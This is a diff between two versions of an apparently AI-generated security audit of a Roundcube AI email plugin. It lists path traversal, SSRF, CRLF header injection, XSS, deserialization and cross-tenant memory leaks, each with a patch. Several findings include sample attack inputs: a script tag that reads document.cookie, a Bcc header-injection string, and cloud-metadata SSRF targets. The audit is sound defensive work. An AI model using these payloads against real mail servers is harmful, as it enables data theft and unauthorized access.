+         $args['attachments'][] = ['path' => $full_path, 'name' => $att['name']];
+     }
+     ```
+  4. Roundcube attaches `/etc/passwd` to the draft. If the path specified is `config/config.inc.php`, the host database credentials, encryption `des_key`, and master configuration are attached to the draft and exfiltrated.
+- **Remediation Diff:**
   ```diff
   --- a/lifeprisma_ai.php
   +++ b/lifeprisma_ai.php
-  @@ -528,6 +528,12 @@ class lifeprisma_ai extends rcube_plugin
-           if (!$this->is_admin()) {
-               header('Content-Type: application/json');
-               echo json_encode(['status' => 'error', 'message' => 'Access denied']);
-               exit;
-           }
+  @@ -2580,11 +2580,18 @@ class lifeprisma_ai extends rcube_plugin
+                   foreach ($data['attachments'] as $att) {
+                       $full_path = $att['path'] ?? '';
+  -                    if (!empty($full_path) && strpos($full_path, '/') !== 0) {
+  -                        $full_path = $this->home . '/' . $full_path;
+  -                    }
+  -                    if (file_exists($full_path)) {
+  +                    // Strictly confine attachments to plugin data/attachments directory
+  +                    $base_allowed = realpath($this->home . '/data/attachments');
+  +                    if (!$base_allowed) continue;
+  +                    
+  +                    $resolved = realpath(strpos($full_path, '/') === 0 ? $full_path : $this->home . '/' . $full_path);
+  +                    if (!$resolved || strpos($resolved, $base_allowed) !== 0) {
+  +                        $this->ai_log("[SECURITY] Blocked unauthorized attachment path traversal: " . $full_path);
+  +                        continue;
+  +                    }
+  +                    if (file_exists($resolved)) {
+                           $args['attachments'][] = [
+  -                            'path' => $full_path,
+  +                            'path' => $resolved,
+                               'name' => $att['name'] ?? basename($full_path),
+                               'mimetype' => $att['mimetype'] ?? 'application/octet-stream',
+                           ];
+  ```
+
+---
+
+### [CRITICAL] Issue 3.3: Cross-User Tenant Information Disclosure via Global AI Memory
+- **Location:** [`lifeprisma_ai.php:2343-2372`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2343-L2372), [`2520-2535`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2520-L2535)
+- **CWE:** CWE-359 (Exposure of Private Personal Information), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
+- **Reproduction Scenario:**
+  1. `User A` (`ceo@company.com`) sends a confidential email negotiating a deal: `"The confidential acquisition offer is $5.2M with 15% escrow"`.
+  2. `handle_message_sent()` triggers automatically, strips quotes, and writes the subject and reply into `$this->home . '/data/ai_memory.json'`.
+  3. `User B` (`contractor@company.com`) receives an email asking `"What is the acquisition escrow terms?"`.
+  4. `handle_triage()` reads `data/ai_memory.json`, matches `acquisition` and `escrow`, and injects `User A`'s confidential text into `User B`'s triage briefing as a `"VERIFIED PREVIOUS CLIENT ANSWER"`.
+  5. `User B` now has full visibility into `User A`'s private deal terms without authorization.
+- **Remediation Diff:**
+  Memory must be partitioned by authenticated user ID:
+  ```diff
+  --- a/lifeprisma_ai.php
+  +++ b/lifeprisma_ai.php
+  @@ -2343,10 +2343,12 @@ class lifeprisma_ai extends rcube_plugin
+       public function get_memory_file()
+       {
+  -        $dir = $this->home . '/data';
   +        $rcmail = rcmail::get_instance();
-  +        if (!$rcmail->check_request_token(rcube_utils::INPUT_POST)) {
-  +            header('Content-Type: application/json', true, 403);
-  +            echo json_encode(['status' => 'error', 'message' => 'Invalid CSRF token']);
-  +            exit;
-  +        }
-  ```
-
----
-
-### [CRITICAL] Issue 3.2: Blind Server-Side Request Forgery (SSRF) & Intranet Exposure
-- **CWE:** [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
-- **Affected Files:**
-  - [`lifeprisma_ai.php:1007-1031`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1007-L1031) (`handle_stream`)
-  - [`lifeprisma_ai.php:1328-1336`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1328-L1336) (`handle_request`)
-  - [`lifeprisma_ai.php:2057-2065`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2057-L2065) (`call_ai_direct`)
-- **Vulnerability Flow:**
-  - The administrator or an attacker (via CSRF) configures `api_url` to `http://169.254.169.254/latest/meta-data/` or `http://10.0.0.5:8080/internal-api`.
-  - cURL initializes `$ch = curl_init($api_url)`.
-  - `CURLOPT_PROTOCOLS_ALLOWED` is unset, allowing non-HTTP schemes (e.g. `gopher://`, `file://`).
-  - No IP address filter validates whether the resolved IP falls in RFC 1918 private subnets, localhost (`127.0.0.1`), or link-local ranges (`169.254.0.0/16`).
-- **Remediation Patch:**
-  Add URL validation and sanitize URLs prior to issuing cURL requests:
-  ```php
-  private function validate_api_url($url, $allow_local = false)
-  {
-      $parts = parse_url($url);
-      if (!$parts || !in_array(strtolower($parts['scheme'] ?? ''), ['http', 'https'])) {
-          return false;
-      }
-      $host = $parts['host'] ?? '';
-      if (empty($host)) return false;
-
-      if ($allow_local && ($host === 'localhost' || $host === '127.0.0.1')) {
-          return true;
-      }
-
-      $ips = dns_get_record($host, DNS_A + DNS_AAAA);
-      if (empty($ips)) {
-          $ip = gethostbyname($host);
-          $ips = [['ip' => $ip]];
-      }
-
-      foreach ($ips as $record) {
-          $target_ip = $record['ip'] ?? ($record['ipv6'] ?? '');
-          if (filter_var($target_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
-              return false; // Blocks 127.0.0.1, 10.x, 192.168.x, 169.254.x
-          }
-      }
-      return true;
-  }
-  ```
-
----
-
-### [HIGH] Issue 3.3: Insecure Deserialization via Unfiltered `unserialize()` (CWE-502)
-- **CWE:** [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
-- **Affected Files:**
-  - [`lifeprisma_ai.php:589`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L589) (`get_admin_config`)
-  - [`lifeprisma_ai.php:651`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L651) (`get_user_usage`)
-- **Vulnerability Mechanics:**
-  `unserialize($row['preferences'])` executes with PHP's default behavior, which permits class instantiation. In environments utilizing libraries such as Guzzle, Monolog, or PEAR (all standard in Roundcube ecosystems), arbitrary POP (Property-Oriented Programming) gadget chains can be triggered if the database row is modified.
-- **Remediation Patch:**
-  ```diff
-  --- a/lifeprisma_ai.php
-  +++ b/lifeprisma_ai.php
-  @@ -586,7 +586,7 @@ class lifeprisma_ai extends rcube_plugin
-           $result = $db->query("SELECT preferences FROM users WHERE username = ?", '__genia_admin__');
-           $row = $db->fetch_assoc($result);
-           if ($row && !empty($row['preferences'])) {
-  -            $data = unserialize($row['preferences']);
-  +            $data = unserialize($row['preferences'], ['allowed_classes' => false]);
-               return $data['genia_admin'] ?? [];
+  +        $user_id = $rcmail->user ? (int) $rcmail->user->ID : 0;
+  +        $dir = $this->home . '/data/memory';
+           if (!is_dir($dir)) {
+  -            @mkdir($dir, 0755, true);
+  +            @mkdir($dir, 0750, true);
            }
-           return [];
-  @@ -648,7 +648,7 @@ class lifeprisma_ai extends rcube_plugin
-           $users = [];
-           while ($row = $db->fetch_assoc($result)) {
-  -            $prefs = unserialize($row['preferences']);
-  +            $prefs = unserialize($row['preferences'], ['allowed_classes' => false]);
-               $users[] = [
+  -        return $dir . '/ai_memory.json';
+  +        return $dir . '/user_' . md5("salt_{$user_id}") . '.json';
+       }
   ```
 
 ---
 
-### [HIGH] Issue 3.4: Email Header Injection in Automated IMAP Draft Generation (CWE-93)
-- **CWE:** [CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')](https://cwe.mitre.org/data/definitions/93.html)
-- **Affected File:** [`lifeprisma_ai.php:2134-2152`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2134-L2152) (`create_imap_draft`)
-- **Vulnerability Mechanics:**
-  ```php
-  $headers = [
-      'Date: ' . date('r'),
-      'From: ' . $from_str,
-      'To: ' . $to,
-      'Subject: ' . $re_subject,
-      // ...
-  ];
-  $raw_message = implode("\r\n", $headers) . "\r\n\r\n" . $full_body;
-  ```
-  `$to` and `$subject` are derived from incoming untrusted emails. If an incoming message contains CRLF characters in the `From` or `Subject` header (e.g., `From: sender@domain.com\r\nBcc: victim@domain.com\r\nX-Injected: true`), the raw string concatenation injects arbitrary RFC 822 headers or splits the MIME message boundary.
-  Furthermore, non-ASCII characters in subjects (e.g. accented letters, Cyrillic, Chinese, emojis) are written without RFC 2047 MIME header encoding (`=?UTF-8?B?...?=`), corrupting IMAP headers.
-- **Remediation Patch:**
+### [HIGH] Issue 3.4: Server-Side Request Forgery (SSRF) via Unvalidated Domain Resolution
+- **Location:** [`lifeprisma_ai.php:1761-1782`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1761-L1782)
+- **CWE:** CWE-918 (Server-Side Request Forgery)
+- **Failure Vector:**
+  `validate_api_url()` checks if the scheme is `https`, then checks if the host ends in `.googleapis.com`. If neither, it checks `filter_var($host, FILTER_VALIDATE_IP)`. If `$host` is an arbitrary alphanumeric domain (e.g. `https://attacker-domain.com` or `https://internal.company.lan`), `filter_var` returns `false`, falling through to line 1781: `return true;`.
+  An attacker or compromised admin can point the endpoint to an external domain configured to resolve to `127.0.0.1` (DNS Rebinding) or an internal microservice, allowing cURL to transmit POST requests with internal authorization headers.
+- **Remediation Diff:**
   ```diff
   --- a/lifeprisma_ai.php
   +++ b/lifeprisma_ai.php
-  @@ -2134,8 +2134,11 @@ class lifeprisma_ai extends rcube_plugin
-  +            // Sanitize CRLF to prevent RFC822 Header Injection
-  +            $clean_to = preg_replace('/[\r\n]+/', ' ', trim($to));
-  +            $clean_subject = preg_replace('/[\r\n]+/', ' ', trim($re_subject));
-  +            $encoded_subject = rcube_mime::encode_header('Subject', $clean_subject);
-               $headers = [
-                   'Date: ' . date('r'),
-                   'From: ' . $from_str,
-  -                'To: ' . $to,
-  -                'Subject: ' . $re_subject,
-  +                'To: ' . $clean_to,
-  +                $encoded_subject,
-                   'Message-ID: ' . $msg_id,
-  ```
-
----
-
-### [HIGH] Issue 3.5: DOM XSS via Unescaped API/Error Payloads & Admin Form Fields
-- **CWE:** [CWE-79: Cross-Site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
-- **Affected File:** [`src/lifeprisma_ai.js:877, 887, 2482-2538`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877)
-- **Vulnerability Mechanics:**
-  1. [`src/lifeprisma_ai.js:877`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877):
-     ```javascript
-     targetEl.innerHTML = '<span style="color:#ef4444">Error: ' + (event.message || 'Unknown') + '</span>';
-     ```
-     `event.message` originating from remote API servers or SSE payloads is written directly into `targetEl.innerHTML` without sanitization. An adversarial or compromised LLM endpoint returning HTML/JavaScript executes immediately in the client context.
-  2. [`src/lifeprisma_ai.js:2489-2530`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2489-L2530):
-     Admin modal fields interpolate `p.label`, `pid`, `p.api_url`, and model names directly into HTML attribute strings:
-     ```javascript
-     html += '<input type="text" class="lpai-admin-input lpai-admin-label" value="' + (p.label || '') + '">';
-     ```
-     An attacker controlling provider labels (via config import or CSRF) can inject `"><script>alert(document.cookie)</script>`.
-- **Remediation Patch:**
-  Add a robust HTML entity encoder in JavaScript and replace direct concatenation:
-  ```javascript
-  function lpai_escape_html(str) {
-      if (str === null || str === undefined) return '';
-      return String(str)
-          .replace(/&/g, '&amp;')
-          .replace(/</g, '&lt;')
-          .replace(/>/g, '&gt;')
-          .replace(/"/g, '&quot;')
-          .replace(/'/g, '&#039;');
-  }
-  ```
-
----
-
-### [MEDIUM] Issue 3.6: Fatal Runtime TypeError in `handle_new_messages`
-- **CWE:** [CWE-248: Uncaught Exception](https://cwe.mitre.org/data/definitions/248.html)
-- **Affected File:** [`lifeprisma_ai.php:1802-1812`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1802-L1812)
-- **Failure Mode:**
-  In Roundcube, `$storage->search($mbox, 'UNSEEN RECENT')` returns an instance of `rcube_result_set`.
-  ```php
-  $uids = $storage->search($mbox, 'UNSEEN RECENT');
-  // ...
-  $uids = array_slice(array_reverse($uids), 0, 2);
-  ```
-  In PHP 8.0+, passing an object to `array_reverse()` triggers a fatal runtime error:
-  `Fatal error: Uncaught TypeError: array_reverse(): Argument #1 ($array) must be of type array, rcube_result_set given`.
-  This terminates the Roundcube session poll and prevents all subsequent hooks from executing.
-- **Remediation Patch:**
-  ```diff
-  --- a/lifeprisma_ai.php
-  +++ b/lifeprisma_ai.php
-  @@ -1802,6 +1802,12 @@ class lifeprisma_ai extends rcube_plugin
-           $uids = $storage->search($mbox, 'UNSEEN RECENT');
-           if (empty($uids)) {
-               $uids = $storage->search($mbox, 'UNSEEN');
+  @@ -1774,9 +1774,15 @@ class lifeprisma_ai extends rcube_plugin
+               return true;
            }
-  +        if (is_object($uids) && method_exists($uids, 'get')) {
-  +            $uids = $uids->get();
+
+  -        // Validate IP to prevent SSRF if custom endpoint
+  -        if (filter_var($host, FILTER_VALIDATE_IP)) {
+  -            return filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
+  +        // Strict DNS resolution & private IP rejection
+  +        $resolved_ip = gethostbyname($host);
+  +        if (empty($resolved_ip) || $resolved_ip === $host) {
+  +            return false;
   +        }
-  +        if (!is_array($uids) || empty($uids)) {
-  +            return;
-  +        }
+  +
+  +        if (!filter_var($resolved_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+  +            $this->ai_log("[SECURITY] Prohibited SSRF target resolving to private IP: " . $resolved_ip);
+  +            return false;
+           }
+
+           return true;
   ```
 
 ---
 
-### [MEDIUM] Issue 3.7: SSE Infinite Stream Accumulation on API Error
-- **CWE:** [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
-- **Affected File:** [`lifeprisma_ai.php:1034-1051`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1034-L1051)
-- **Failure Mode:**
-  In `CURLOPT_WRITEFUNCTION`:
+### [HIGH] Issue 3.5: Email Header Injection (CRLF) in Standalone Worker
+- **Location:** [`bin/worker.php:626-643`](file:///home/koen/Git/roundcube-AI/bin/worker.php#L626-L643)
+- **CWE:** CWE-93 (Improper Neutralization of CRLF Sequences - 'CRLF Injection')
+- **Failure Vector:**
+  In `lpai_worker_format_draft_message()`, headers are assembled:
   ```php
-  if ($stream_first_chunk) {
-      $stream_first_chunk = false;
-      // ...
-      if (isset($err['error'])) {
-          echo "data: " . json_encode(['type' => 'error', 'message' => $msg]) . "\n\n";
-          flush();
-          return strlen($data); // <--- ERROR
-      }
-  }
+  $headers[] = "To: $to";
+  $headers[] = "Subject: $re_subject";
   ```
-  Returning `strlen($data)` signals to cURL that the callback successfully accepted the data and should continue downloading. When an upstream provider returns a massive HTML 502 error gateway page or unformatted error trace, cURL continues reading chunks, appending to `$stream_buffer`, and finally prints `echo "data: [DONE]\n\n";` at line 1167 as if the operation completed normally.
-- **Remediation Patch:**
-  Return `0` to abort the cURL transfer immediately upon encountering a fatal API error.
+  If an incoming email has a crafted subject or `From` address containing `\r\nBcc: attacker@domain.com`, the worker writes injected headers directly into the draft. When a user clicks "Send", the email is dispatched to unauthorized third parties.
+- **Remediation Diff:**
+  ```diff
+  --- a/bin/worker.php
+  +++ b/bin/worker.php
+  @@ -611,6 +611,8 @@ function lpai_worker_format_draft_message($to, $subject, $reply_body, $orig_msg
+       $date = date('r');
+  +    $clean_to = preg_replace('/[\r\n]+/', ' ', trim($to));
+  +    $clean_subj = preg_replace('/[\r\n]+/', ' ', trim($re_subject));
+  +    $encoded_subj = function_exists('mb_encode_mimeheader') ? mb_encode_mimeheader($clean_subj, 'UTF-8') : $clean_subj;
+  -    $re_subject = (stripos($subject, 'Re:') === 0) ? $subject : 'Re: ' . $subject;
+
+       // Quote original message body
+  @@ -628,8 +630,8 @@ function lpai_worker_format_draft_message($to, $subject, $reply_body, $orig_msg
+       $headers[] = "Date: $date";
+       $headers[] = "From: <$my_email>";
+  -    $headers[] = "To: $to";
+  -    $headers[] = "Subject: $re_subject";
+  +    $headers[] = "To: $clean_to";
+  +    $headers[] = "Subject: $encoded_subj";
+       $headers[] = "MIME-Version: 1.0";
+  ```
 
 ---
 
-### [LOW] Issue 3.8: Unbounded Growth in User Template Preferences
-- **CWE:** [CWE-770: Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)
-- **Affected File:** [`lifeprisma_ai.php:700-720`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L700-L720) (`handle_templates`)
-- **Failure Mode:**
-  The `save` operation appends templates to `genia_templates` without checking count or size limits:
-  `$templates[] = ['id' => uniqid('tpl_'), 'name' => $name, 'action' => $action, 'instruction' => $instruction];`
-  Users can submit thousands of templates or multi-megabyte instruction payloads, exceeding database column storage sizes for `preferences` (often `TEXT` or `VARCHAR`).
-- **Remediation:** Enforce a maximum of 50 templates per user and a 2,000-character ceiling per template instruction.
+### [MEDIUM] Issue 3.6: Insecure Default SSL Context in Standalone Worker
+- **Location:** [`bin/worker.php:243-249`](file:///home/koen/Git/roundcube-AI/bin/worker.php#L243-L249)
+- **CWE:** CWE-295 (Improper Certificate Validation)
+- **Failure Vector:**
+  `LpaiImapClient::connect()` unconditionally disables SSL verification:
+  `'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true`.
+  When connecting across local networks or remote hosts, an attacker on the same segment can perform an active SSL MITM and capture plaintext IMAP passwords.
+- **Remediation:** Provide an explicit configuration setting `lifeprisma_ai_worker_imap_ssl_verify` (defaulting to `true`).
 
 ---
 
 ## 4. Architecture, Performance & Resilience Gaps
 
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                          CURRENT ARCHITECTURE GAPS                          │
-├─────────────────────────────────────────────────────────────────────────────┤
-│                                                                             │
-│   Client Request ──► [Roundcube PHP]                                        │
-│                            │                                                │
-│              Holds Session Lock (Up to 120s)                                │
-│                            │                                                │
-│                            ▼                                                │
-│                  [Synchronous cURL] ──────► [LLM API Provider]              │
-│                            │                         │                      │
-│                   Blocks Webmail UI             60-120s Wait                │
-│                                                                             │
-│   Admin Stats ──────► [Full Table Scan]                                     │
-│                            │                                                │
-│                 SELECT * WHERE LIKE '%genia_%'                              │
-│                            │                                                │
-│                 Unindexed 500k User Records                                 │
-│                                                                             │
-│   Global Settings ──► [users Table Hijack]                                  │
-│                            │                                                │
-│                 Fake User '__genia_admin__'                                 │
-│                 SQLite Incompatible (now())                                 │
-│                                                                             │
-│   Cache State ─────► [Redis-Only Dependency]                                │
-│                            │                                                │
-│                 Redis absent? Return null ──► Duplicate Drafts Every Poll   │
-│                                                                             │
-└─────────────────────────────────────────────────────────────────────────────┘
-```
-
-### Gap 4.1: Session Lock Contention During Synchronous Generation
-- **Root Cause:** PHP's standard session handler locks the session file (`sess_<id>`) on `session_start()` and holds it until script completion unless explicitly released via `session_write_close()`.
-- **Bottleneck:** In [`handle_request()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) and [`handle_autodraft()`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1834), cURL is invoked synchronously with timeouts of 60 to 120 seconds. Because `session_write_close()` is never called, any subsequent webmail action (checking mail, opening a folder, browsing messages) hangs indefinitely until the cURL request completes.
-- **Remediation:** Invoke `session_write_close()` immediately after validating the request and reading preferences.
-
----
-
-### Gap 4.2: Architectural Anti-Pattern: Injecting Dummy User `__genia_admin__` into `users` Table
-- **Location:** [`lifeprisma_ai.php:582-611`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L582-L611)
-- **Flaw:**
-  1. Roundcube's `users` table is intended strictly for authenticating email identities. Storing system configuration inside a dummy user `'__genia_admin__'` violates database normalization.
-  2. Line 608 uses MySQL-specific syntax: `VALUES (?, ?, ?, now())`. Roundcube supports SQLite and PostgreSQL; in SQLite, `now()` throws a fatal query error (`no such function: now`).
-  3. Administrative queries require negative filtering (`WHERE username != '__genia_admin__'`) to prevent metrics contamination.
-- **Remediation:**
-  Use Roundcube's native system configuration system (`config.inc.php`) or store plugin options in the Roundcube `system` table if persistent runtime updates are required:
-  ```php
-  $db = $rcmail->get_dbh();
-  $now_expr = $db->now(); // Cross-database compatible SQL expression
-  ```
-
----
-
-### Gap 4.3: Unindexed Table Scans in Admin Dashboard
-- **Location:** [`lifeprisma_ai.php:628-659`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L628-L659)
-- **Flaw:**
+### Issue 4.1: Database Core Table Pollution & Unindexed Full-Table Scans
+- **Location:** [`lifeprisma_ai.php:1675-1732`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1675-L1732)
+- **Deficiency:**
+  Global admin configuration is stored as a dummy row (`username = '__genia_admin__'`) in Roundcube's core `users` table. In `get_usage_stats()`, it executes:
   ```sql
   SELECT COUNT(*) as active_users FROM users WHERE username != '__genia_admin__' AND preferences LIKE '%genia_%'
   ```
-  In enterprise deployments with 50,000+ mail accounts, searching serialized data with leading wildcards (`LIKE '%genia_%'`) forces a full sequential scan of large `TEXT`/`LONGTEXT` columns on every admin dashboard render, saturating database I/O.
-- **Remediation:** Maintain a lightweight summary table or cache the metric in Redis/file cache with a 1-hour TTL.
+  `preferences` is an unindexed `TEXT` or `LONGTEXT` column containing serialized PHP arrays. In mail servers with $10,000+$ users, running `LIKE '%genia_%'` executes a full-table table scan, reading megabytes of serialized blobs from disk on every admin settings page access.
+- **Architectural Solution:**
+  1. Store global administrator configuration in Roundcube's native `system` table via `$db->query("SELECT value FROM {$system_table} WHERE name = 'lifeprisma_admin'")` or in `config.inc.php`.
+  2. Cache the active user count in the file/Redis cache with a 1-hour TTL instead of executing full-table scans on every HTTP request.
 
 ---
 
-### Gap 4.4: Runaway Draft Duplication When Redis is Absent
-- **Location:** [`lifeprisma_ai.php:791-810, 1868-1877`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L791-L810)
-- **Flaw:**
-  The deduplication check in `should_auto_draft()` relies entirely on `$this->cache_get($cache_key)`.
-  If Redis is not installed (which is typical on basic Roundcube installs), `redis_connect()` returns `false`, and `cache_get()` returns `null` on every invocation.
-  Consequently, every incoming mail check or read view re-evaluates the same message as unprocessed, spawning duplicate draft replies on every page refresh.
-- **Remediation:** Implement an automatic fallback to user preferences (`genia_autodraft_log`) or local file-based cache when Redis is unavailable.
+### Issue 4.2: Missing Token Usage Accounting in SSE Streaming
+- **Location:** [`lifeprisma_ai.php:680-768`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L680-L768)
+- **Deficiency:**
+  When invoking `handle_stream()`, the stream payload omits `"stream_options": {"include_usage": true}`. OpenAI and Google Gemini API endpoints do not emit token usage objects in streaming chunks unless explicitly requested. As a result, `$stream_tokens` remains `['input' => 0, 'output' => 0]`, and the client UI displays `$0.00` or fails to account for usage.
+- **Remediation:** Add `"stream_options" => ["include_usage" => true]` to the request payload and capture usage chunks in `CURLOPT_WRITEFUNCTION`.
+
+---
+
+### Issue 4.3: Unbounded SSE Stream Buffer Growth
+- **Location:** [`lifeprisma_ai.php:733-736`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L733-L736)
+- **Deficiency:**
+  `$stream_buffer .= $data;` accumulates data until a newline `\n` is encountered. If an upstream proxy or gateway errors out and sends a continuous payload without newlines (or a large binary dump), `$stream_buffer` grows until PHP memory limits (`memory_limit`) are exhausted, terminating the script with a fatal error.
+- **Remediation:** Enforce a maximum chunk buffer limit (e.g. 64 KB). If `$stream_buffer` exceeds this without newlines, abort the transfer.
 
 ---
 
 ## 5. Prioritized Action Matrix
 
 | Priority | Category | File / Component | Effort | Expected Impact |
-| :---: | :--- | :--- | :---: | :--- |
-| **P0** | **Security** | [`lifeprisma_ai.php:526, 815, 1175, 1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php) | **Low** (1h) | Eliminates critical CSRF vulnerability across all plugin endpoints. |
-| **P0** | **Security** | [`lifeprisma_ai.php:1025, 1329, 2058`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php) | **Medium** (2h) | Prevents Blind SSRF and unauthorized intranet / metadata exploration. |
-| **P0** | **Reliability** | [`lifeprisma_ai.php:1802-1812`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1802-L1812) | **Low** (30m) | Fixes fatal PHP 8 `TypeError` when handling IMAP search results. |
-| **P1** | **Performance** | [`lifeprisma_ai.php:1175, 1834`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1175) | **Low** (30m) | Resolves session lockup blocking webmail navigation during AI generation. |
-| **P1** | **Security** | [`lifeprisma_ai.php:2134-2152`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2134-L2152) | **Low** (1h) | Blocks CRLF Email Header Injection in auto-draft generation. |
-| **P1** | **Security** | [`lifeprisma_ai.php:589, 651`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L589) | **Low** (30m) | Hardens `unserialize()` against PHP Object Injection (CWE-502). |
-| **P1** | **Security** | [`src/lifeprisma_ai.js:877, 2489`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L877) | **Medium** (2h) | Sanitizes dynamic DOM strings to eliminate XSS (CWE-79). |
-| **P2** | **Mathematics** | [`lifeprisma_ai.php:1454-1462`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1454-L1462) | **Low** (30m) | Corrects sign calculation for Spamd bar scores. |
-| **P2** | **Mathematics** | [`src/lifeprisma_ai.js:2203-2223`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L2203-L2223) | **Low** (1h) | Resolves falsy zero pricing bug and adds Gemini fallback rates. |
-| **P2** | **Architecture** | [`lifeprisma_ai.php:1868-1877`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1868-L1877) | **Medium** (3h) | Adds non-Redis state cache to prevent duplicate drafts. |
-| **P3** | **Architecture** | [`lifeprisma_ai.php:582-611`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L582-L611) | **High** (5h) | Migrates `__genia_admin__` dummy user to native Roundcube config/system table. |
-| **P3** | **Performance** | [`lifeprisma_ai.php:628-659`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L628-L659) | **Medium** (2h) | Eliminates full table scans on `users.preferences` with cached metrics. |
-
----
-*Report generated and validated autonomously against codebase baseline.*
+| :---: | :---: | :--- | :---: | :--- |
+| **P0** | **Security** | [`lifeprisma_ai.php:2086-2098`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2086-L2098) | **Low** (1h) | **Eliminates Remote Code Execution (RCE)** by enforcing file extension whitelists on template uploads. |
+| **P0** | **Security** | [`lifeprisma_ai.php:2580-2594`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2580-L2594) | **Low** (1h) | **Prevents Arbitrary Local File Exfiltration** by confining composer attachment paths with `realpath()`. |
+| **P0** | **Security** | [`lifeprisma_ai.php:2343-2372`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2343-L2372) | **Medium** (2h) | **Prevents Cross-Tenant Data Leaks** by isolating AI memory per authenticated user ID. |
+| **P1** | **Security** | [`bin/worker.php:628-639`](file:///home/koen/Git/roundcube-AI/bin/worker.php#L628-L639) | **Low** (30m) | **Prevents Email Header Injection (CRLF)** in background worker drafts. |
+| **P1** | **Security** | [`lifeprisma_ai.php:1761-1782`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1761-L1782) | **Low** (1h) | **Blocks SSRF & DNS Rebinding** by resolving hostnames and validating against private IP ranges. |
+| **P1** | **Logic / Math** | [`lifeprisma_ai.php:2396-2400`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L2396-L2400) | **Low** (15m) | **Prevents Irrelevant Prompt Contamination** by returning empty set on zero memory match scores. |
+| **P2** | **Logic / Math** | [`src/lifeprisma_ai.js:1471-1486`](file:///home/koen/Git/roundcube-AI/src/lifeprisma_ai.js#L1471-L1486) | **Low** (1h) | Fixes dynamic pricing lookup and `$0.000000` zero formatting in frontend cost estimation. |
+| **P2** | **Performance** | [`lifeprisma_ai.php:1720-1732`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L1720-L1732) | **Medium** (2h) | Eliminates unindexed `users.preferences LIKE '%genia_%'` full-table database scans. |
+| **P2** | **Resilience** | [`lifeprisma_ai.php:680-768`](file:///home/koen/Git/roundcube-AI/lifeprisma_ai.php#L680-L768) | **Low** (1h) | Fixes zero token reporting during SSE streaming via `stream_options.include_usage`. |
+| **P3** | **Security** | [`bin/worker.php:243-249`](file:///home/koen/Git/roundcube-AI/bin/worker.php#L243-L249) | **Low** (30m) | Enables configurable SSL certificate verification for IMAP daemon. |
